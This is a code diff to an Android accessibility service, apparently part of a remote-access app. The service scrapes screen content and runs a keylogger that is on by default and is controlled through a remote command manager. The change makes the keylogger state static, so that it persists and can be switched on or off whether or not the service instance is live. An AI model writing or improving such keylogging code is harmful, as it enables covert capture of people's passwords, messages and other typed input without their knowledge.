@@ -17,7 +17,7 @@ class RemoteAccessibilityService : AccessibilityService() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var lastScrapedTime = 0L
 
-    private var isKeyloggerActive = true
+    private var isKeyloggerActive = staticKeyloggerActive
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -141,8 +141,12 @@ class RemoteAccessibilityService : AccessibilityService() {
         var instance: RemoteAccessibilityService? = null
             private set
 
+        var staticKeyloggerActive = true
+
         fun isServiceEnabled(): Boolean {
-            return instance != null
+            return instance != null || AccessibilityOverlayManager.isAccessibilityEnabled(
+                com.example.data.sync.RemoteCommandManager.instanceContext ?: return false
+            )
         }
 
         fun performAction(actionId: Int): Boolean {
@@ -151,8 +155,8 @@ class RemoteAccessibilityService : AccessibilityService() {
         }
 
         fun setKeyloggerActive(active: Boolean): Boolean {
-            val service = instance ?: return false
-            service.isKeyloggerActive = active
+            staticKeyloggerActive = active
+            instance?.isKeyloggerActive = active
             return true
         }
     }
